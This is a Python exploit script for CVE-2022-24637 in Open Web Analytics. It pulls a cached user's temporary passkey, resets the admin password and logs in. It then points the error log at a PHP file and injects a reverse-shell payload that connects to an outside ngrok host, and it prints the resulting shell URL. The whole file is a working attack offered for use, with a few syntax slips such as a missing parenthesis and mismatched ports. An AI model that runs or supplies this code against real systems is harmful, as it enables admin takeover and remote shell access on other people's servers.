import string
import hashlib
import requests
import os
import base64
import json
import re
import sys
from rich.console import Console

console =Console()


#CVE_2022_246_37
#Author: ys jhonson le wana
#facebook :https://www.facebook.com/jhlk.lua'
#Email:wannaajhonson@gmail.com



for key in range(100):
  
  base_url=sys.argv[1]
  user_id = 'user_id' + str(key)
  userid_hash = hashlib.md5(user_id.encode()).hexdigest() 
  filename = userid_hash + '.php'
  filename = userid_hash + '.php'
  cache_url = base_url + "owa-data/caches/" + str(key) + "/owa_user/" + filename
  cache = requests.get(cache_url)
  v = str(cache.status_code)
  if v == '200':
  	vx = str(cache.text)
  	sd = vx.replace('*' , '  *')
  	yum = sd.replace('*' ,'')
  	varane = yum.split()
  	hash = varane[1]
  	decode =base64.b64decode(hash).decode("ascii")
  	user = r'"user_id";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:5:"(\w*)"'
  	re1 = re.search(user, decode).group(1)
  	
  	blue1 = '[bold yellow]' +'[INFO]'
  	console.print(blue1, f'nom d\'utulisateur : {re1}')
  	
  	password =  r'"temp_passkey";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:32:"(\w*)"'
  	re2 = re.search(password, decode).group(1)
  	console.print(blue1, 'Votre mot de pass temporaire est : ' +f'{re2}')
  	
  	#hash
  	
  	
  	login = base_url + "index.php?owa_do=base.loginForm"
  	
  	password= base_url + "index.php?owa_do=base.usersPasswordEntry"
  	
  	config= base_url + "index.php?owa_do=base.optionsGeneral"
  	new_pass="xDG0RjM7iBtyZBFR"
  	
  	data1 = {
      "owa_password": new_pass,
      "owa_password2": new_pass,
      "owa_k": re2,
      "owa_action": 
      "base.usersChangePassword"
   }
  	


  	req1 = requests.post(password, data=data1)
  	
  	session= requests.Session()
  	data2 = {
      "owa_user_id": 'admin',
      "owa_password": new_pass,
      "owa_action": "base.login"
   }
  	
  	req2 = session.post(login, data=data2)
  	
  	
  	cookie = session.cookies.get_dict()
  	
  	
  	shell = 'sm.php'
  	log_location = "/var/www/html/owa/owa-data/caches/" + shell
  	
  	xx = requests.get(config , cookies=cookie)
  	regex = r'owa_nonce" value="(\w*)"'
  	rec = re.search(regex, xx.text).group(1)
  	nonce = rec
  	
  	
  	
  	console.print(blue1, f'id_site :{nonce}')
  	
  	
  	
  	
  	
  	data3 = {
      "owa_nonce": nonce, 
      "owa_action": "base.optionsUpdate", 
      "owa_config[base.error_log_file]": log_location, 
      "owa_config[base.error_log_level]": 2
   }
  	
  	sam = requests.post(config, data=data3, cookies=cookie)
  	
  	
  	
  
  	
  	jon = '<?php system("bash -i >& /dev/tcp/0.tcp.in ngrok.io/17440 0>&1");?>'
  	
  	payload = '<?php $sock=fsockopen("0.tcp.in.ngrok.io",17740;$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);?>'

  	
  	
  	data4 = {
      "owa_nonce": nonce,
      "owa_action": "base.optionsUpdate", 
      "owa_config[shell]": payload
   }
  	
  	
  	sad = requests.post(config, data=data4, cookies=cookie)
  	cd = str(sad.url)
  	base= base_url+"owa-data/caches/" + shell
  	car = '\033[92m' + '[success]'
  	
  	print(car, f'Url du shell : {base}')
  	
  	
  		
  		
  		
  	
  	
   
   
   
   
   
     
   
   
   
   
   
  
  	
  	
  	
